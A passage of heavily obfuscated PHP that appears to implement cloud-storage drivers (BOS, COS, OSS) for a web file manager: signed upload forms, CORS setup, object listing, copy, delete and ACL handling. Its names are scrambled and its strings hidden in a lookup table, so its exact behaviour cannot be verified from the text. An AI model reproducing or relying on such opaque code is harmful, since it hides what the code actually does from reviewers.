(isset($‹å“ª×í[$ˆü¥Š±[1412]]) && $‹å“ª×í[$ˆü¥Š±[1412]]) { $ğŠÕè¯£ = $ˆü¥Š±[1411]; } } $îôÂ‚Ş÷ = KodIO::defaultDriver(); if (strtolower($îôÂ‚Ş÷[$ˆü¥Š±[98]]) == $ˆü¥Š±[109] && is_array($îôÂ‚Ş÷[$ˆü¥Š±[6]])) { $‰ŠÊè÷õ = $îôÂ‚Ş÷[$ˆü¥Š±[6]][$ˆü¥Š±[1264]]; if (substr($‰ŠÊè÷õ, 0, 2) == $ˆü¥Š±[1413]) { $‰ŠÊè÷õ = str_replace($ˆü¥Š±[1413], BASIC_PATH, $‰ŠÊè÷õ); } $‰ŠÊè÷õ = str_replace($ˆü¥Š±[256], $ˆü¥Š±[8], $‰ŠÊè÷õ); if (substr($õ¶¨»ª[$ˆü¥Š±[87]], 0, strlen($‰ŠÊè÷õ)) == $‰ŠÊè÷õ) { $ğŠÕè¯£ = $ˆü¥Š±[196]; } } } return $ğŠÕè¯£ == $ˆü¥Š±[1411] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ƒßô®ğ) { parent::__construct($ƒßô®ğ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($îÛ‡ƒ½€) { $îÖúŞ¯ =& $_SERVER[ÔÕ±ĞšÎ]; if (substr($îÛ‡ƒ½€, 0, 7) == $îÖúŞ¯[218]) { $îÛ‡ƒ½€ = $îÖúŞ¯[219] . substr($îÛ‡ƒ½€, 7); } header($îÖúŞ¯[175] . $îÛ‡ƒ½€); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ú¿ù£ªØ) { parent::__construct($Ú¿ù£ªØ); $this->setSignVersion($_SERVER[ÔÕ±ĞšÎ][249]); } public function uploadFormData($ÜßğÌ¸ù, $£ĞÏ± ¿ = 3600) { $Éà¯œ  =& $_SERVER[ÔÕ±ĞšÎ]; $€Ÿ½· = $Éà¯œ [231]; $‘ù´àââ = $Éà¯œ [1414]; $•ÀÏºíõ = $Éà¯œ [263]; $‰ñŠ£Ò° = gmdate($Éà¯œ [1415], time() + $£ĞÏ± ¿); $Œ¾Î“½° = (string) time() . $Éà¯œ [74] . (string) (time() + $£ĞÏ± ¿); $øË¥Ê‹ = array($Éà¯œ [264] => $‰ñŠ£Ò°, $Éà¯œ [267] => array(array($Éà¯œ [308] => $€Ÿ½·), array($Éà¯œ [268] => $this->bucket), array($Éà¯œ [269], $Éà¯œ [270], $Éà¯œ [12]), array($Éà¯œ [272] => $•ÀÏºíõ), array($Éà¯œ [1416] => $‘ù´àââ), array($Éà¯œ [1417] => $this->accessKey), array($Éà¯œ [1418] => $Œ¾Î“½°))); $øË¥Ê‹ = json_encode($øË¥Ê‹); $¨¾¨âì = hash_hmac($Éà¯œ [1414], $Œ¾Î“½°, $this->secret); $õìœª„£ = sha1($øË¥Ê‹); $ğ¨…óÏé = hash_hmac($Éà¯œ [1414], $õìœª„£, $¨¾¨âì); $ş—¼‰ = array($Éà¯œ [308] => $€Ÿ½·, $Éà¯œ [272] => $•ÀÏºíõ, $Éà¯œ [279] => base64_encode($øË¥Ê‹), $Éà¯œ [1416] => $‘ù´àââ, $Éà¯œ [1417] => $this->accessKey, $Éà¯œ [1419] => $Œ¾Î“½°, $Éà¯œ [1420] => $ğ¨…óÏé, $Éà¯œ [208] => $this->getHost()); return $ş—¼‰; } public function fileOutImage($¿‰ŒÏáİ, $Å› ŠÕ = 250) { $÷ŠŸ»İ› =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->size($¿‰ŒÏáİ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¿‰ŒÏáİ, $Å› ŠÕ); } $Ş‘ç¯Å… = $this->link($¿‰ŒÏáİ); $Ş‘ç¯Å… .= $÷ŠŸ»İ›[1421] . $Å› ŠÕ . $÷ŠŸ»İ›[1422]; $this->fileOutLink($Ş‘ç¯Å…); } public function fileOutLink($õ¯úŸ¶½) { $›ï¤¡»¿ =& $_SERVER[ÔÕ±ĞšÎ]; if (substr($õ¯úŸ¶½, 0, 7) == $›ï¤¡»¿[218]) { $õ¯úŸ¶½ = $›ï¤¡»¿[219] . substr($õ¯úŸ¶½, 7); } header($›ï¤¡»¿[175] . $õ¯úŸ¶½); die; } } goto AŸ³à«„; fÊÍ—Ñ­·: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ûÀ¨­ƒò) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÔÕ±ĞšÎ][1465]; $this->_init($ûÀ¨­ƒò); } public function _init($¬û‹‹§±) { $âäı³½ü =& $_SERVER[ÔÕ±ĞšÎ]; $this->config = $¬û‹‹§±; foreach ($¬û‹‹§± as $”÷´ÚÎú => $Ö©é²©Æ) { if (isset($this->{$”÷´ÚÎú})) { $this->{$”÷´ÚÎú} = $Ö©é²©Æ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($âäı³½ü[1466] . LNG($âäı³½ü[1467])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ş¹Ñ =& $_SERVER[ÔÕ±ĞšÎ]; $µ·óÉÇ’ = new OSS\Model\CorsConfig(); $ãö–‘·º = new OSS\Model\CorsRule(); $ãö–‘·º->addAllowedOrigin($ş¹Ñ[1468]); $ãö–‘·º->addAllowedMethod($ş¹Ñ[1469]); $ãö–‘·º->addAllowedMethod($ş¹Ñ[1470]); $ãö–‘·º->addAllowedMethod($ş¹Ñ[1471]); $ãö–‘·º->addAllowedMethod($ş¹Ñ[1472]); $ãö–‘·º->addAllowedMethod($ş¹Ñ[165]); $ãö–‘·º->setMaxAgeSeconds(600); $ãö–‘·º->addExposeHeader($ş¹Ñ[1473]); $ãö–‘·º->addAllowedHeader($ş¹Ñ[1468]); $µ·óÉÇ’->addRule($ãö–‘·º); try { $this->client->putBucketCors($this->bucket, $µ·óÉÇ’); } catch (OSS\Core\OssException $Øù¬÷¹) { $this->writeLog(__FUNCTION__ . $ş¹Ñ[214] . $Øù¬÷¹->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÒæáÏ =& $_SERVER[ÔÕ±ĞšÎ]; $ÁŒĞÅ­ = null; try { $ÁŒĞÅ­ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $€Äˆ×Û) { $this->writeLog(__FUNCTION__ . $ÒæáÏ[214] . $€Äˆ×Û->getMessage()); return null; } if (!$ÁŒĞÅ­ || !($ƒèíÆ„³ = $ÁŒĞÅ­->getRules())) { return null; } $×­‰ö¶Ş = $ƒèíÆ„³[0]->getAllowedOrigins(); $¬¶³Ò‚« = $ƒèíÆ„³[0]->getAllowedMethods(); $¯ÁÔ™– = $ƒèíÆ„³[0]->getMaxAgeSeconds(); $˜ÏİÄÑ = $ƒèíÆ„³[0]->getExposeHeaders(); $âÑ‚ŞèŒ = $ƒèíÆ„³[0]->getAllowedHeaders(); return array($ÒæáÏ[220] => isset($×­‰ö¶Ş[0]) ? $×­‰ö¶Ş[0] : $ÒæáÏ[12], $ÒæáÏ[224] => $¬¶³Ò‚«, $ÒæáÏ[1474] => $¯ÁÔ™–, $ÒæáÏ[1475] => isset($˜ÏİÄÑ[0]) ? $˜ÏİÄÑ[0] : $ÒæáÏ[12], $ÒæáÏ[221] => isset($âÑ‚ŞèŒ[0]) ? $âÑ‚ŞèŒ[0] : $ÒæáÏ[12]); } public function isBucketCors() { $½´«‹‚ğ =& $_SERVER[ÔÕ±ĞšÎ]; $ëğæ” = $this->getBucketCors(); if (!$ëğæ” || !is_array($ëğæ”)) { return !1; } if ($ëğæ”[$½´«‹‚ğ[220]] != $½´«‹‚ğ[222] || $ëğæ”[$½´«‹‚ğ[221]] != $½´«‹‚ğ[222]) { return !1; } $ğ¡Ù… € = array_map($½´«‹‚ğ[223], $ëğæ”[$½´«‹‚ğ[224]]); if (!is_array($ğ¡Ù… €)) { $ğ¡Ù… € = array(); } $ÃÌ‹¦çñ = array($½´«‹‚ğ[225], $½´«‹‚ğ[226], $½´«‹‚ğ[227], $½´«‹‚ğ[228], $½´«‹‚ğ[229]); $£ºòò„´ = array_diff($ÃÌ‹¦çñ, $ğ¡Ù… €); return empty($£ºòò„´); } public function mkfile($¼‰–êëÈ, $¨¯ÈÇû× = '', $’ë¸‚¡– = REPEAT_RENAME) { $Ûõã ÒÈ = $this->setContent($¼‰–êëÈ, $¨¯ÈÇû×); if ($Ûõã ÒÈ !== !1) { return $this->getPathOuter($¼‰–êëÈ); } return !1; } public function mkdir($ã·ˆ¤¡Æ, $öÃ¥öÚ© = REPEAT_SKIP) { if ($öÃ¥öÚ© && $this->_isFolder($ã·ˆ¤¡Æ)) { return $this->getPathOuter($ã·ˆ¤¡Æ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ã·ˆ¤¡Æ)); } catch (OSS\Core\OssException $êµ¡å¥´) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][214] . $êµ¡å¥´->getMessage()); return !1; } return $this->getPathOuter($ã·ˆ¤¡Æ); } private function fileList($ÛÏ°å¯Ù, $ûğÙ§Ø = '', $°£˜ô¬™ = 0) { $»ÄÙ¤Ö¤ =& $_SERVER[ÔÕ±ĞšÎ]; $ÛÏ°å¯Ù = trim($ÛÏ°å¯Ù, $»ÄÙ¤Ö¤[8]); $šô±¯ä = empty($ÛÏ°å¯Ù) && $ÛÏ°å¯Ù !== $»ÄÙ¤Ö¤[230] ? $»ÄÙ¤Ö¤[12] : $ÛÏ°å¯Ù . $»ÄÙ¤Ö¤[8]; $ÌÇ‘ÑÅÃ = $»ÄÙ¤Ö¤[12]; $¹Ÿ·‹¤¶ = 1000; $½åğÂô = $ÁÕ¶¯ƒ = array(); while (!0) { check_abort(); $¢ë¦°«Ù = array($»ÄÙ¤Ö¤[1476] => $ûğÙ§Ø, $»ÄÙ¤Ö¤[1477] => $šô±¯ä, $»ÄÙ¤Ö¤[1478] => $¹Ÿ·‹¤¶, $»ÄÙ¤Ö¤[1479] => $ÌÇ‘ÑÅÃ); try { $ïÍŠë€ï = $this->client->listObjects($this->bucket, $¢ë¦°«Ù); } catch (OSS\Core\OssException $…çõ´š ) { $this->writeLog(__FUNCTION__ . $»ÄÙ¤Ö¤[214] . $…çõ´š ->getMessage()); break; } $ÌÇ‘ÑÅÃ = $ïÍŠë€ï->getNextMarker(); $ìĞı’ŒË = $ïÍŠë€ï->getObjectList(); $‚êÓú€ = $ïÍŠë€ï->getPrefixList(); foreach ($ìĞı’ŒË as $ÂËş¨åÇ) { if ($ÂËş¨åÇ->getKey() == $šô±¯ä) { continue; } $û”®°ş = $ÂËş¨åÇ->getKey(); $–¼Î¥ˆ­ = $ÂËş¨åÇ->getSize(); $ü÷˜ü = $ÂËş¨åÇ->getLastModified(); $­‹êô† = trim($ÂËş¨åÇ->getETag(), $»ÄÙ¤Ö¤[121]); $“Ğåš‹¶ = $°£˜ô¬™ ? array($»ÄÙ¤Ö¤[32] => $û”®°ş, $»ÄÙ¤Ö¤[79] => $–¼Î¥ˆ­, $»ÄÙ¤Ö¤[206] => strtotime($ü÷˜ü), $»ÄÙ¤Ö¤[1480] => $­‹êô†) : $û”®°ş; $ù‚¬Ú— = $–¼Î¥ˆ­ == 0 && substr($û”®°ş, strlen($û”®°ş) - 1, 1) == $»ÄÙ¤Ö¤[8] ? !0 : !1; $’‹í¹’§ = array($»ÄÙ¤Ö¤[79] => $–¼Î¥ˆ­, $»ÄÙ¤Ö¤[1481] => $–¼Î¥ˆ­, $»ÄÙ¤Ö¤[88] => strtotime($ü÷˜ü), $»ÄÙ¤Ö¤[1482] => $ü÷˜ü, $»ÄÙ¤Ö¤[1480] => $­‹êô†); $this->cacheMethodInfoSet($û”®°ş, $ù‚¬Ú—, $’‹í¹’§); if ($ù‚¬Ú—) { $½åğÂô[] = $û”®°ş; continue; } $ÁÕ¶¯ƒ[] = $“Ğåš‹¶; } foreach ($‚êÓú€ as $«†ÌÉ) { $½åğÂô[] = $«†ÌÉ->getPrefix(); $this->cacheMethodInfoSet($«†ÌÉ->getPrefix(), !0); } if ($ÌÇ‘ÑÅÃ === $»ÄÙ¤Ö¤[12]) { break; } } $this->cacheMethodInfoSet($ÛÏ°å¯Ù, !0); return array($»ÄÙ¤Ö¤[85] => $½åğÂô, $»ÄÙ¤Ö¤[86] => $ÁÕ¶¯ƒ); } public function listObject($¥šñ§Ø¤, $ò´§¢™ = '') { $Ñ“Ö¸÷ =& $_SERVER[ÔÕ±ĞšÎ]; $¥šñ§Ø¤ = trim($¥šñ§Ø¤, $Ñ“Ö¸÷[8]); $‚ñ…Âü¹ = empty($¥šñ§Ø¤) && $¥šñ§Ø¤ !== $Ñ“Ö¸÷[230] ? $Ñ“Ö¸÷[12] : $¥šñ§Ø¤ . $Ñ“Ö¸÷[8]; $·®ı…Ïù = $Ñ“Ö¸÷[12]; $Ô¶õï÷é = 1000; $ŞØóÛ—¦ = $è¤¹ã¹È = array(); while (!0) { check_abort(); $Îîò½Á = array($Ñ“Ö¸÷[1476] => $ò´§¢™, $Ñ“Ö¸÷[1477] => $‚ñ…Âü¹, $Ñ“Ö¸÷[1478] => $Ô¶õï÷é, $Ñ“Ö¸÷[1479] => $·®ı…Ïù); try { $”¼æ¨¸ = $this->client->listObjects($this->bucket, $Îîò½Á); } catch (OSS\Core\OssException $¤‡ÜşâÁ) { $this->writeLog(__FUNCTION__ . $Ñ“Ö¸÷[214] . $¤‡ÜşâÁ->getMessage()); break; } $·®ı…Ïù = $”¼æ¨¸->getNextMarker(); $­µ”ÉöŸ = $”¼æ¨¸->getObjectList(); foreach ($­µ”ÉöŸ as $ÏûÏØ³˜) { if ($ÏûÏØ³˜->getKey() == $‚ñ…Âü¹) { continue; } $ƒöîø = $ÏûÏØ³˜->getKey(); $éˆ³çí² = $ÏûÏØ³˜->getSize(); $šèÎ·’ì = $éˆ³çí² == 0 && substr($ƒöîø, strlen($ƒöîø) - 1, 1) == $Ñ“Ö¸÷[8] ? !0 : !1; if ($šèÎ·’ì) { continue; } $è¤¹ã¹È[] = $éˆ³çí² . $Ñ“Ö¸÷[214] . $ƒöîø; } if ($·®ı…Ïù === $Ñ“Ö¸÷[12]) { break; } } return array($Ñ“Ö¸÷[85] => $ŞØóÛ—¦, $Ñ“Ö¸÷[86] => $è¤¹ã¹È); } public function copyFile($ƒ¯ÑÙß¦, $Æ®¹¿Û) { $†º‹«é¶ = $this->size($ƒ¯ÑÙß¦); if ($†º‹«é¶ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ƒ¯ÑÙß¦, $this->bucket, $this->pathEncode($Æ®¹¿Û)); } catch (OSS\Core\OssException $æöÅ°ÖÌ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][214] . $æöÅ°ÖÌ->getMessage()); return !1; } return $this->getPathOuter($Æ®¹¿Û); } $¿è¸è¹‚ = $this->multiCopyObject($ƒ¯ÑÙß¦, $Æ®¹¿Û, $†º‹«é¶); return $¿è¸è¹‚ ? $this->getPathOuter($Æ®¹¿Û) : !1; } private function multiCopyObject($¼ˆºÍ‚, $âßÎ¹Ô™, $Œˆªøö…) { $˜Àñïğç =& $_SERVER[ÔÕ±ĞšÎ]; try { $äó§Ôú« = array(); if ($¾ö¤©ÙÑ = $this->hashMd5($¼ˆºÍ‚)) { $äó§Ôú« = array(OSS\OssClient::OSS_HEADERS => array($˜Àñïğç[1483] => $¾ö¤©ÙÑ)); } $¸Ì÷Êä½ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($âßÎ¹Ô™), $äó§Ôú«); $Ñ‰ëÓÙ = 1; $··”“„‡ = 0; $Ó–ÚàÖÁ = array(); $Ú– ±÷Ä = 1024 * 1024 * 10; $İ—ÍÏÙµ = $this->client->generateMultiuploadParts($Œˆªøö…, $Ú– ±÷Ä); foreach ($İ—ÍÏÙµ as $×…âïÍ => $÷À‰åè’) { $ÏùÍœ– = $··”“„‡ + (int) $÷À‰åè’[$˜Àñïğç[1484]]; $êŞÓ©«ä = (int) $÷À‰åè’[$˜Àñïğç[414]] + $ÏùÍœ– - 1; $Èß‡ ¹¿ = array($˜Àñïğç[167] => $ÏùÍœ–, $˜Àñïğç[168] => $êŞÓ©«ä); $Ó–ÚàÖÁ[] = $this->client->uploadPartCopy($this->bucket, $¼ˆºÍ‚, $this->bucket, $this->pathEncode($âßÎ¹Ô™), $Ñ‰ëÓÙ, $¸Ì÷Êä½, $Èß‡ ¹¿); $Ñ‰ëÓÙ = $Ñ‰ëÓÙ + 1; } $‹¸íĞ© = array(); foreach ($Ó–ÚàÖÁ as $×…âïÍ => $³†‹ºÚÙ) { $‹¸íĞ©[] = array($˜Àñïğç[299] => $×…âïÍ + 1, $˜Àñïğç[300] => $³†‹ºÚÙ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($âßÎ¹Ô™), $¸Ì÷Êä½, $‹¸íĞ©); } catch (OSS\Core\OssException $ºà·¥è¿) { $this->writeLog(__FUNCTION__ . $˜Àñïğç[214] . $ºà·¥è¿->getMessage()); return !1; } return !0; } public function moveFile($€ğËÉÎ, $×à¶ß’Ì) { if ($this->copyFile($€ğËÉÎ, $×à¶ß’Ì)) { $this->remove($€ğËÉÎ); return $this->getPathOuter($×à¶ß’Ì); } return !1; } public function delFile($õİê¿„¤) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($õİê¿„¤)); } catch (OSS\Core\OssException $Êïşö) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][214] . $Êïşö->getMessage()); return !1; } return !0; } public function delFolder($æñĞê›Á) { $Ûé¯¹ºÁ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->exist($æñĞê›Á)) { return !0; } $this->listItemCache = !1; $™Ğ’ÍÇ = $this->fileList($æñĞê›Á); $this->listItemCache = !0; $¿¢£³÷‚ = trim($æñĞê›Á, $Ûé¯¹ºÁ[8]) . $Ûé¯¹ºÁ[8]; if (!empty($æñĞê›Á) && $æñĞê›Á !== $Ûé¯¹ºÁ[230] && !in_array($¿¢£³÷‚, $™Ğ’ÍÇ[$Ûé¯¹ºÁ[85]])) { $™Ğ’ÍÇ[$Ûé¯¹ºÁ[85]][] = $¿¢£³÷‚; } $¾ß´ş´Œ = $this->delByBatch($™Ğ’ÍÇ[$Ûé¯¹ºÁ[86]]); if (!$¾ß´ş´Œ) { return !1; } $¾ß´ş´Œ = $this->delByBatch($™Ğ’ÍÇ[$Ûé¯¹ºÁ[85]]); if (!$¾ß´ş´Œ) { return !1; } return $this->delFile($¿¢£³÷‚); } private function delByBatch($¦ÔÖ»Šã) { foreach (array_chunk($¦ÔÖ»Šã, 1000) as $Ü—ï”Ò) { try { $this->client->deleteObjects($this->bucket, $Ü—ï”Ò); } catch (OSS\Core\OssException $ıë€êª) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][214] . $ıë€êª->getMessage()); return !1; } } return !0; } public function rename($âÎ…Ï¶Ó, $´¿œÈÍø) { return $this->renameObject($âÎ…Ï¶Ó, $´¿œÈÍø); } private function fileInfo($öõ² ®õ, $ğ¹Ÿ¨Äí = false, $ÎÕÖÌ  = array()) { $Òé¨Øšú =& $_SERVER[ÔÕ±ĞšÎ]; $¯Àìş = array($Òé¨Øšú[32] => $this->pathThis($öõ² ®õ), $Òé¨Øšú[87] => $this->getPathOuter($öõ² ®õ), $Òé¨Øšú[33] => $Òé¨Øšú[232], $Òé¨Øšú[79] => isset($ÎÕÖÌ [$Òé¨Øšú[79]]) ? $ÎÕÖÌ [$Òé¨Øšú[79]] : 0, $Òé¨Øšú[169] => $this->ext($öõ² ®õ)); if ($ğ¹Ÿ¨Äí) { return $¯Àìş; } $¯Àìş[$Òé¨Øšú[233]] = $¯Àìş[$Òé¨Øšú[88]] = 0; $¯Àìş[$Òé¨Øšú[234]] = $¯Àìş[$Òé¨Øšú[235]] = !0; if (empty($ÎÕÖÌ )) { $‰Š²ıè” = $this->objectMeta($öõ² ®õ); if (!$‰Š²ıè”) { return $¯Àìş; } $ÎÕÖÌ  = array($Òé¨Øšú[88] => strtotime($‰Š²ıè”[$Òé¨Øšú[1482]]), $Òé¨Øšú[79] => $‰Š²ıè”[$Òé¨Øšú[1481]] + 0, $Òé¨Øšú[1480] => $‰Š²ıè”[$Òé¨Øšú[1480]]); } if (isset($ÎÕÖÌ [$Òé¨Øšú[1480]]) && $ÎÕÖÌ [$Òé¨Øšú[1480]]) { $¯Àìş[$Òé¨Øšú[237]] = trim($ÎÕÖÌ [$Òé¨Øšú[1480]], $Òé¨Øšú[121]); } if (isset($ÎÕÖÌ [$Òé¨Øšú[79]])) { $¯Àìş[$Òé¨Øšú[79]] = $ÎÕÖÌ [$Òé¨Øšú[79]]; } if (isset($ÎÕÖÌ [$Òé¨Øšú[88]])) { $¯Àìş[$Òé¨Øšú[88]] = $ÎÕÖÌ [$Òé¨Øšú[88]]; } if (isset($ÎÕÖÌ [$Òé¨Øšú[206]]) && !trim($¯Àìş[$Òé¨Øšú[88]])) { $¯Àìş[$Òé¨Øšú[88]] = $ÎÕÖÌ [$Òé¨Øšú[206]]; } return $¯Àìş; } private function folderInfo($©ıÜ­µÇ, $ı†ºÕÏ… = false, $Á˜Øã„´ = array()) { $Üù›Õ¬Ò =& $_SERVER[ÔÕ±ĞšÎ]; $ÆÕÇ©Æ® = array($Üù›Õ¬Ò[32] => $this->pathThis($©ıÜ­µÇ), $Üù›Õ¬Ò[87] => $this->getPathOuter($Üù›Õ¬Ò[8] . $©ıÜ­µÇ), $Üù›Õ¬Ò[33] => $Üù›Õ¬Ò[78]); if ($ı†ºÕÏ…) { return $ÆÕÇ©Æ®; } $ÆÕÇ©Æ®[$Üù›Õ¬Ò[233]] = $ÆÕÇ©Æ®[$Üù›Õ¬Ò[88]] = 0; $ÆÕÇ©Æ®[$Üù›Õ¬Ò[234]] = $ÆÕÇ©Æ®[$Üù›Õ¬Ò[235]] = !0; if (empty($Á˜Øã„´)) { $©ıÜ­µÇ = rtrim($©ıÜ­µÇ, $Üù›Õ¬Ò[8]) . $Üù›Õ¬Ò[8]; $¿Šá©í¾ = $this->objectMeta($©ıÜ­µÇ); if (!$¿Šá©í¾) { return $ÆÕÇ©Æ®; } $Á˜Øã„´ = array($Üù›Õ¬Ò[233] => $¿Šá©í¾[$Üù›Õ¬Ò[577]][$Üù›Õ¬Ò[1485]], $Üù›Õ¬Ò[88] => strtotime($¿Šá©í¾[$Üù›Õ¬Ò[1482]])); } if (isset($Á˜Øã„´[$Üù›Õ¬Ò[88]])) { $ÆÕÇ©Æ®[$Üù›Õ¬Ò[88]] = $Á˜Øã„´[$Üù›Õ¬Ò[88]]; } if (isset($Á˜Øã„´[$Üù›Õ¬Ò[233]])) { $ÆÕÇ©Æ®[$Üù›Õ¬Ò[233]] = $Á˜Øã„´[$Üù›Õ¬Ò[233]]; } return $ÆÕÇ©Æ®; } public function listPath($‘ÚªƒÖÒ, $»Û°‡×í = false) { $²²ñåáÙ =& $_SERVER[ÔÕ±ĞšÎ]; $¬Åë™¼â = $this->fileList($‘ÚªƒÖÒ, $²²ñåáÙ[8], !0); foreach ($¬Åë™¼â[$²²ñåáÙ[85]] as $÷èŸù¦ì => $ĞéÆ´ª) { $¬Åë™¼â[$²²ñåáÙ[85]][$÷èŸù¦ì] = $this->folderInfo($ĞéÆ´ª, $»Û°‡×í, $ĞéÆ´ª); } foreach ($¬Åë™¼â[$²²ñåáÙ[86]] as $÷èŸù¦ì => $ĞéÆ´ª) { $¬Åë™¼â[$²²ñåáÙ[86]][$÷èŸù¦ì] = $this->fileInfo($ĞéÆ´ª[$²²ñåáÙ[32]], $»Û°‡×í, $ĞéÆ´ª); } return $¬Åë™¼â; } protected function infoChildren($¹ôùääé, &$ÇÙÜíô‰) { $˜¶Õ¸ê =& $_SERVER[ÔÕ±ĞšÎ]; $­ÆÈù = $this->fileList($¹ôùääé, $˜¶Õ¸ê[12], !0); $ÇÙÜíô‰[$˜¶Õ¸ê[81]] += count($­ÆÈù[$˜¶Õ¸ê[85]]); $ÇÙÜíô‰[$˜¶Õ¸ê[80]] += count($­ÆÈù[$˜¶Õ¸ê[86]]); foreach ($­ÆÈù[$˜¶Õ¸ê[86]] as $ãŸØÅ»à) { if (!$ãŸØÅ»à || !$ãŸØÅ»à[$˜¶Õ¸ê[79]]) { continue; } $ÇÙÜíô‰[$˜¶Õ¸ê[79]] += $ãŸØÅ»à[$˜¶Õ¸ê[79]]; } } public function has($£æøÇ, $Ç˜ô…Ä² = false, $¿Ô¾‡ƒ = true) { $Úä¹›Úü =& $_SERVER[ÔÕ±ĞšÎ]; $£æøÇ = trim($£æøÇ, $Úä¹›Úü[8]); $ù§©ıÅ© = empty($£æøÇ) && $£æøÇ !== $Úä¹›Úü[230] ? $Úä¹›Úü[12] : $£æøÇ . $Úä¹›Úü[8]; $’°î•ô  = $Úä¹›Úü[12]; $‹¯ÂÚİÄ = 500; $—°¦ÊàÛ = $æşÇò† = 0; while (!0) { check_abort(); $à”¢ªŸú = array($Úä¹›Úü[1476] => $Úä¹›Úü[8], $Úä¹›Úü[1477] => $ù§©ıÅ©, $Úä¹›Úü[1478] => $‹¯ÂÚİÄ, $Úä¹›Úü[1479] => $’°î•ô ); try { $â±£¾å = $this->client->listObjects($this->bucket, $à”¢ªŸú); } catch (OSS\Core\OssException $çÂ©ˆ£×) { $this->writeLog(__FUNCTION__ . $Úä¹›Úü[214] . $çÂ©ˆ£×->getMessage()); break; } $’°î•ô  = $â±£¾å->getNextMarker(); $áÛ ‘¦ = $â±£¾å->getObjectList(); $Óüæ«ë = $â±£¾å->getPrefixList(); if ($Ç˜ô…Ä²) { if (count($áÛ ‘¦) > 1 || count($áÛ ‘¦) == 1 && $áÛ ‘¦[0]->getKey() != $ù§©ıÅ©) { $—°¦ÊàÛ += count($áÛ ‘¦) - 1; } if (!empty($Óüæ«ë)) { $æşÇò† += count($Óüæ«ë); } if ($’°î•ô  === $Úä¹›Úü[12]) { break; } continue; } if ($¿Ô¾‡ƒ) { if (!empty($áÛ ‘¦)) { if (count($áÛ ‘¦) > 1 || $áÛ ‘¦[0]->getKey() != $ù§©ıÅ©) { return !0; } } } else { if (!empty($Óüæ«ë)) { return !0; } } if ($’°î•ô  === $Úä¹›Úü[12]) { break; } } if ($Ç˜ô…Ä²) { return array($Úä¹›Úü[241] => $—°¦ÊàÛ, $Úä¹›Úü[242] => $æşÇò†); } return !1; } public function listAll($ªê„¡°é) { $Ïôü¸ªÕ =& $_SERVER[ÔÕ±ĞšÎ]; $ğÌ€¡ËÏ = $this->fileList($ªê„¡°é, $Ïôü¸ªÕ[12], !0); $Ïî±í¨› = array_to_keyvalue($ğÌ€¡ËÏ[$Ïôü¸ªÕ[86]], $Ïôü¸ªÕ[32]); foreach ($ğÌ€¡ËÏ[$Ïôü¸ªÕ[85]] as $ô†ğºĞ¤) { if (is_string($ô†ğºĞ¤)) { $Ïî±í¨›[$ô†ğºĞ¤] = array($Ïôü¸ªÕ[79] => 0); } } return $this->listAllFiles($ªê„¡°é, $Ïî±í¨›); } public function canRead($ÔëÕ‹Î) { $Ô´şªû =& $_SERVER[ÔÕ±ĞšÎ]; $¦Üï†üÍ = $this->pathAcl($ÔëÕ‹Î); return $¦Üï†üÍ == $Ô´şªû[1486] || $¦Üï†üÍ == $Ô´şªû[624] ? !0 : !1; } public function canWrite($ùü¿ØÃ¢) { $±ªŞ‰Çµ = $this->pathAcl($ùü¿ØÃ¢); return $±ªŞ‰Çµ == $_SERVER[ÔÕ±ĞšÎ][624] ? !0 : !1; } public function pathAcl($ÇÚä±Ç¨) { $îÎŠØ¡‘ =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÜŸÙ¨ò£ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÇÚä±Ç¨)); } catch (OSS\Core\OssException $ş¬ÜÆŞà) { $this->writeLog(__FUNCTION__ . $îÎŠØ¡‘[214] . $ş¬ÜÆŞà->getMessage()); return !1; } $™º¥™Š = $ÜŸÙ¨ò£ == $îÎŠØ¡‘[37] ? $this->bucketAcl : $ÜŸÙ¨ò£; if ($™º¥™Š == $îÎŠØ¡‘[1487]) { return $îÎŠØ¡‘[1486]; } if ($™º¥™Š == $îÎŠØ¡‘[1488]) { return $îÎŠØ¡‘[624]; } return $™º¥™Š; } private function chmodPath($‰Šíßî, $ÚºŞóÎó = '') { $ƒ€ØÎÑÂ =& $_SERVER[ÔÕ±ĞšÎ]; $šıß®¤ª = empty($ÚºŞóÎó) ? $ƒ€ØÎÑÂ[1488] : $ÚºŞóÎó; $¡¤š„¶š = array($ƒ€ØÎÑÂ[37], $ƒ€ØÎÑÂ[231], $ƒ€ØÎÑÂ[1487], $ƒ€ØÎÑÂ[1488]); if (!in_array($šıß®¤ª, $¡¤š„¶š)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($‰Šíßî), $šıß®¤ª); } catch (OSS\Core\OssException $èÜûÍÚô) { $this->writeLog(__FUNCTION__ . $ƒ€ØÎÑÂ[214] . $èÜûÍÚô->getMessage()); return !1; } return !0; } public function getContent($Ä™©âÀ) { return $this->fileSubstr($Ä™©âÀ, -1); } public function 